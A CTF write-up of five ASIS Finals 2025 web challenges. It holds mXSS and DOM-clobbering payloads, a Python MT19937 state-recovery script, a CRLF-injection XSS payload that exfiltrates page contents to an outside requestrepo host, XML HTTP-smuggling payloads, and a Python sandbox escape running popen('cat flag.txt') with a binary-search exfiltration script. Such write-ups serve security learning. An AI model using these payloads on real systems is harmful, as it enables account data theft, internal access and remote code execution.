# ASIS Finals 2025 - Web
Contains writeups for One Shoot Game, Bookmarks, Web Mail, Rick's Gallery, Sanchess.
## One shoot game

This was a notes app XSS challenge. We could create notes and view them. The bot will save flag as a note on its own account, and then view ours. We don't need to exfiltrate flag, we just needed to leak flag note's ID, since there are no ownership checks to view. (This solution is likely unintended.)

We had two interesting vectors - 
```html
<script nonce="{{ nonce }}">
    if (options.user_styling) {

        const theme = document.createElement('style');
        const hidden = document.getElementById('document-body-hidden');

        const body = document.getElementById('document-body');
        // disable tag id
        body.innerHTML = DOMPurify.sanitize(body.textContent,{ RETURN_DOM: true, ALLOWED_TAGS: ['class', 'style'] }).ownerDocument.documentElement.innerHTML;

        theme.textContent = document.getElementById('user-theme-styles').textContent;
        theme.nonce = '{{ nonce }}';
        document.head.appendChild(theme);
        localStorage.setItem('user_theme', theme.textContent);
    }
</script>
```
and
```html
<script nonce="{{ nonce }}">
            const theme = document.createElement('style');
            theme.textContent = localStorage.getItem('user_theme') || "";
            theme.nonce = '{{ nonce }}';
            document.head.appendChild(theme);
</script>
```

DOMPurify version being old, is usless. So we can inject any html, like - 
```html
<title>
    <p id="</title><img src=x onerror=alert(1)>"></p>
</title>
<p id="</title><img src=x onerror=alert(2)>"></p>
```
([Refer here](https://book.jorianwoltjer.com/web/client-side/cross-site-scripting-xss#mutation-xss-and-dompurify))

But we dont have js execution, so we rely on existing logic and DOM clobbering. We can hijack 
```js
theme.textContent = document.getElementById('user-theme-styles').textContent;
```
by creating a fake element with textContent to what we want. This eventually gets stored into localStorage, and then, when bot visits vault, which contains its note URLs, gets injected back as CSS. 

Till now, we have CSS injection on vault page which contains 
```html
<a href="{{ url_for('workspace.display_document', doc_id=document.id) }}" class="btn">View</a>
```

The issue is that the id is 25 chars long, and we only have 5 seconds of time. This seemed very troublesome, since we only had one shot, as in next run, flag id is completely random. We could, in theory, open our controlled web page with websocket opened to our server to immediately run fresh XS leak payloads that leaks 3 chars at a time, and self updates. But it was too troublesome.

So sorry, but everything above is irrelevant for next part.
New doc IDs are generated with -
```py
default=lambda: str("".join(random.choices("abcdef01234567890", k=25)))
```
And so, if we can get enough continuous samples, we can easily recreate the random state.

random.choices, just calls this - 
```py
return [population[floor(random() * n)] for i in _repeat(None, k)]
``` 
where population is just choices array, and n is its size. So it basically just gets a random number, scales it to size of possibles choices, and returns that index value.

Each ID gives us 25 outputs of `population[floor(random() * n)]`. So we can use the character to get index and scale it down to actual output.

```c
static PyObject *
_random_Random_random_impl(RandomObject *self)
{
    uint32_t a=genrand_uint32(self)>>5, b=genrand_uint32(self)>>6;
    return PyFloat_FromDouble((a*67108864.0+b)*(1.0/9007199254740992.0));
}
```
Note that there are two zeroes in the population, so we cant possible find the correct index, hence we just skip making any linear equation from 0s.

So, i just quickly collected 500 samples, and ran this code - 
```py
import random
import time
import sys
from math import floor

from gf2bv import LinearSystem, BitVec
from gf2bv.crypto.mt import MT19937

ALPHABET = "abcdef01234567890"

print("[*] Generating simulated leaks...")
actual_random = random.Random()

leaked_chars = []
leak = [....] #fill it with leaked ids
leak = leak[:-1]
for i in leak:
    for j in i:
        leaked_chars.append(j)

# --- SOLVER LOGIC ---

def get_constraints(leaks, alphabet):
    lin = LinearSystem([32] * 624)
    mt_state = lin.gens()
    rng = MT19937(mt_state)
    
    equations = []
    
    char_map = {}
    for idx, char in enumerate(alphabet):
        if char not in char_map: char_map[char] = []
        char_map[char].append(idx)
        
    MULT = len(alphabet)
    print(f"[*] Alphabet Length: {MULT}")
    print(f"[*] Generating constraints from {len(leaks)} chars...")
    
    skipped_eq_count = 0
    
    for i, char in enumerate(leaks):
        # 1. ALWAYS advance the RNG state.
        # random.choices consumes 53 bits (2 x 32-bit words) for every character.
        # We must keep our symbolic RNG in sync with the actual RNG.
        sym_a_full = rng() 
        sym_b_full = rng() 
        
        if char not in char_map:
            return None, None
        possible_indices = char_map[char]

        # 2. If ambiguous (like '0'), SKIP THE EQUATION only.
        # We already advanced the state above, so we stay in sync.
        if len(possible_indices) > 1:
            skipped_eq_count += 1
            continue

        # 3. Reconstruct 53-bit mantissa for valid characters
        # Python's random(): (a >> 5) * 2^-27 + (b >> 6) * 2^-53
        bits_a = sym_a_full._bits[5:32] # top 27 bits
        bits_b = sym_b_full._bits[6:32] # top 26 bits
        sym_53 = BitVec(bits_b + bits_a)
        
        idx = possible_indices[0]

        # 4. Generate Safe Constraints
        min_x = (idx * (1 << 53) + (MULT - 1)) // MULT
        max_x = ((idx + 1) * (1 << 53) - 1) // MULT
        
        diff = min_x ^ max_x
        if diff == 0:
            equations.append(sym_53 ^ min_x)
        else:
            diff_len = diff.bit_length()
            # Mask keeps only bits strictly ABOVE the highest differing bit.
            # This is "safe" - it forces the prefix to match, but leaves lower bits free.
            # Free bits are resolved by overlapping constraints from other samples.
            mask_prefix = (~((1 << diff_len) - 1)) & ((1 << 53) - 1)
            
            if mask_prefix:
                eq = (sym_53 & mask_prefix) ^ (min_x & mask_prefix)
                equations.append(eq)
            
    print(f"[*] Skipped {skipped_eq_count} equations (ambiguous char), but kept RNG synced.")
    print(f"[*] Generated {len(equations)} linear equations.")
    return lin, equations

def solve_state(leaks, alphabet):
    lin, eqs = get_constraints(leaks, alphabet)
    if not lin: return None
    
    print("[*] Solving linear system (this may take a moment)...")
    start_time = time.time()
    
    # solve_one finds a solution that satisfies all constraints.
    # With enough data, this solution is unique and correct.
    solution = lin.solve_one(eqs)
    
    print(f"[*] Solved in {time.time() - start_time:.2f} seconds")
    return solution

# --- EXECUTION ---

solution = solve_state(leaked_chars, ALPHABET)

if solution:
    print("[+] State recovered!")
    
    # The solution is the state BEFORE the first generated character.
    # gf2bv MT19937 starts with mti=624 (needs twist).
    state_tuple = list(solution) + [624]
    
    recovered_rng = random.Random()
    recovered_rng.setstate((3, tuple(state_tuple), None))
    
    print("[*] Verifying state...")
    match = True
    
    # Verify against the first few known leaks
    # We must skip '0' during verification check if we want to be strict,
    # but the recovered RNG should produce '0's at the exact right places.
    for i in range(min(50, len(leaked_chars))):
        expected_char = leaked_chars[i]
        generated_char = "".join(recovered_rng.choices(ALPHABET, k=1))
        
        if generated_char != expected_char:
            print(f"[-] Mismatch at index {i}: Got {generated_char}, Expected {expected_char}")
            match = False
            break
            
    if match:
        print("[+] Verification successful.")
        
        # Predict future tokens
        # Consume the rest of the stream to catch up with actual_random
        # (We already consumed 'min(50...)' chars in the loop above, need to consume the rest)
        remaining_leaks = len(leaked_chars) - min(50, len(leaked_chars))
        if remaining_leaks > 0:
            # Efficiently advance state
            list(recovered_rng.choices(ALPHABET, k=remaining_leaks))

        # Prediction
        next_pred = "".join(recovered_rng.choices(ALPHABET, k=25))
        print(f"[+] Next Predicted Token: {next_pred}")
        for i in range(5):
            print("".join(recovered_rng.choices(ALPHABET, k=25)))
        
    else:
        print("[-] Verification failed.")
else:
    print("[-] No solution found.")
```

That's it, just trigger the bot, and read the flag from predicted ID.


## Bookmarks
This XSS challenge visited our page first, and then logged in with flag as username. And the username was reflected on dashboard, so we just needed to leak contents of /dashboard.

Dashboard had another interesting code - 
```py
rendered = render_template("dashboard.html", username=username)
response = make_response(rendered)
response.headers['X-User-' + username] = user_id
```
Username was also injected into headers. This was a bit suspicious, so I tried \r\n into username while registering and we had CRLF injection.

This was big, by using \r\n\r\n, we completely pushed remaining headers into HTTP body, and thus removing the CSP altogether.

But bot navigated the page to login with flag username, so, what we can do is login with a malicious username in new tab, and open dashboard in another new tab. That way, the code running on dashboard wont stop until browser closes.

Next we start fetching /dashboard from our XSS sink and throwing its contents to our webhook. As soon as bot logged in with flag as username, cookie sent with fetch loop also got updated, and /dashboard response containing the flag got sent to us.

```html
<!DOCTYPE html>
<html>
<body>
    <script>
        let TARGET = "http://web";
        const PASSWORD = "x";
        const PAYLOAD = atob("DQoNCjxzY3JpcHQ+c2V0SW50ZXJ2YWwoKCkgPT4ge2ZldGNoKCIvZGFzaGJvYXJkIikudGhlbihyID0+IHIudGV4dCgpKS50aGVuKHggPT4gd2luZG93Lm9wZW4oImh0dHBzOi8vMDEybGNqOW0ucmVxdWVzdHJlcG8uY29tLz9hPSIreC5tYXRjaCgvQVNJU1x7W1xzXFNdKj9cfS8pKSl9LCAyNTApPC9zY3JpcHQ+")
        function submitForm(action, data, target) {
            let form = document.createElement('form');
            form.action = action;
            form.method = 'POST';
            form.target = target;

            for (let key in data) {
                let input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = data[key];
                form.appendChild(input);
            }
            document.body.appendChild(form);
            form.submit();
            form.remove();
        }
        async function sleep(ms) {return new Promise(r => setTimeout(r, ms))}
        async function exploit() {
            let pwnWin = window.open('about:blank', 'pwn_window');
            submitForm(TARGET + '/login', {
                username: PAYLOAD,
                password: PASSWORD
            }, 'pwn_window');
            await sleep(1000);
            window.open(TARGET + '/dashboard');
        }
        exploit();
    </script>
</body>
</html>
```

Raw Base64 decoded payload - 
```html
\r\n\r\n<script>setInterval(() => {fetch("/dashboard").then(r => r.text()).then(x => window.open("https://abcd.requestrepo.com/?a="+x.match(/ASIS\{[\s\S]*?\}/)))}, 250)</script>
```


## Rick's Gallery
Index.php was acting as a proxy and filter to `file_get_contents` sink in getpic.php. However, the strpos check was case senstive, so we could bypass it by just uppercasing it like PHP://

But the issue was filename was randomized. And glob wrapper doesnt work with file_get_contents. All filters were useless if we didn't know the filename. Using docker vulnerability analysis, I found out about CNEXT exploit. (CVE-2024-2961)

This exactly matched our challenge, and it had a very nice automated PoC [here](https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py). 

I just quickly modified the sending and receiving logic to send the payload in 'Image' header, and base64 decode the response. And finally, just capitalizing all php:// wrappers to PHP://. 

Thats it. With it, we got RCE and just leaked flag through curl.

## ASIS Mail
This has a reverse engineering component. We had our core backend, in a compiled go application. Frontend was a reverse proxy with nginx and a react app.

The API handled all mail management, but there was a separate objectstore (in python) for handling all files. The interesting part was that, it supported listing of directory. Which means, we could exfil the flag filename from it.

The problem was that, to enable directory listing, we needed to send a header - "X-User-ID: 999". But we couldn't add it in our request, as nginx was configured to through 400 Bad Request if that header was present. 
```nginx
if ($http_x_user_id != "") {
    return 400;
}
```

We need SSRF sink.

Upon decompiling go binary, and analyzing the unmarshal logic, it appeared XML also supported attachment_url. And there were two interesting functions, downloadAttachment and downloadAttachmentPost. Our attachment_url was downloaded and stored as attachment to mail which we could view (by sending mail to ourselves).

But again, the problem was it didn't send any header. Another function was downloadAttachmentPost. Tracing back, it triggered if our protocol was http+post://. But this one, unescaped opened a raw tcp socket and appended our path as raw string in the http payload. We could send %0d%0a in path and it would get urldecoded and injected into `POST %s HTTP/1.1...`. Clear case of request smugglink. 

So we send an email to ourselves, with attachment_url containing smuggled http request, whose response will be stored in the objectstore we can view.

Listing directory - 
```xml
<message>
    <to>bhav@asismail.local</to>
    <subject>list</subject>
    <body>test</body>
    <attachment_url>http+post://objectstore:8082/%2e%2e?list=1%20HTTP/1.1%0d%0a%0d%0aGET%20/FLAG?list=1%20HTTP/1.1%0d%0aX-User-ID:%20999%0d%0aHost:%20objectstore%0d%0a%0d%0a</attachment_url>
</message>
```
This just smuggles - 
```
GET /FLAG?list=1 HTTP/1.1
X-User-ID: 999
Host: objectstore
```

We can just download the attachment, and it will contain directory listing. Next, we do the same with flag filename to get its content - 

```xml
<message>
    <to>bhav@asismail.local</to>
    <subject>list</subject>
    <body>test</body>
    <attachment_url>http+post://objectstore:8082/%2e%2e?list=1%20HTTP/1.1%0d%0a%0d%0aGET%20/FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt%20HTTP/1.1%0d%0aX-User-ID:%20999%0d%0aHost:%20objectstore%0d%0a%0d%0a</attachment_url>
</message>
```

In this, we smuggled - 

```
GET /FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt HTTP/1.1
X-User-ID: 999
Host: objectstore
```

Thats it.

## Sanchess
This blackbox chall had some sort of simulation of chess moves. Immediately upon viewing the logic, the comparison operator seemed suspicious. I began testing for different operators, like == and != and it seemed to return normally. I tested operator value as "!= 1#xyz" and didnt seem to error out, confirming that our this input was going into some sort of eval sink.

However open was not defined, nor was `__import__` (both threw 400 bad request). So i pivoted to search for _wrap_close.

I mainly used this structure in operator value - 
`!=(1//0 if payload else 1)#` and `!=(1//1 if payload else 1)#`. If both threw error, that means payload was incorrect or throwing error, else if only first threw error, it meant payload was True or some non null value.

Using this, i confirmed `().__class__.__base__.__subclasses__()` worked fine. Now, we needed to find index of _wrap_close. For that i used this payload - `([i.__name__ for i in ().__class__.__base__.__subclasses__()].index("_wrap_close") > 100)` and just binary searched it. It was 156.

Next,  `().__class__.__base__.__subclasses__()[156].__init__` this existed, but `__globals__` threw error, which indicated blacklisting. So I used - `getattr(().__class__.__base__.__subclasses__()[156].__init__, '__g' + 'lo' + 'bal' + 's_' + '_')`

Next, I added `['po'+'pe'+'n']('cat flag.txt')` (popen seemed to be blacklisted as well). And read was also blacklisted, so i used getattr again. This became the payload to read the flag - 

```py
getattr(getattr(().__class__.__base__.__subclasses__()[156].__init__, '__g'+'lo'+'bal'+'s_'+'_')['po'+'pe'+'n']('cat flag.txt'), 'r'+'e'+'a'+'d')()
```

We needed to use error based oracle to leak the flag char by char. The check became this  - 

```py
!=(1//0 if (ord(getattr(getattr(().__class__.__base__.__subclasses__()[156].__init__, '__g'+'lo'+'bal'+'s_'+'_')['po'+'pe'+'n']('cat flag.txt'), 'r'+'e'+'a'+'d')()[{idx}]) > {value}) else 1)#
```
This would throw error if the specific char ascii value was greater than our test value. So using this, implemented a binary search to exfil full flag - 

```py
import requests
import sys

# Configuration
URL = 'http://65.109.194.105:9090/simulate'
HEADERS = {'content-type': 'application/json'}

def check_greater(idx, value):
    op_payload = (
        "!=(1//0 if ("
        "ord("
        "getattr(getattr(().__class__.__base__.__subclasses__()[156].__init__, '__g'+'lo'+'bal'+'s_'+'_')['po'+'pe'+'n']('cat flag.txt'), 'r'+'e'+'a'+'d')()"
        f"[{idx}]) > {value}"
        ") else 1)#"
    )

    json_data = {
        'rick': {'row': 1, 'col': 6},
        'morty': {'row': 4, 'col': 6},
        'moves': [
            {
                'type': 'conditional',
                'condition': {
                    'type': 'distance',
                    'op': op_payload,
                    'value': 5,
                },
                'then': 'up', 
                'else': 'up',
            },
        ],
    }

    try:
        response = requests.post(URL, headers=HEADERS, json=json_data, verify=False, timeout=5)
        return response.status_code != 200
    except:
        return True

print("[-] Starting Binary Search Exfiltration...")
found_flag = ""

for idx in range(0, 50): 
    low = 32
    high = 126
    
    if check_greater(idx, 127):
        print("\n[!] End of flag detected (IndexError).")
        break

    while low <= high:
        mid = (low + high) // 2
        
        if check_greater(idx, mid):
            low = mid + 1
        else:
            high = mid - 1
            
    char = chr(low)
    found_flag += char
    
    sys.stdout.write(f"\r[+] Flag: {found_flag}")
    sys.stdout.flush()
    
    if char == '}':
        print("\n[*] Flag Complete!")
        break
```
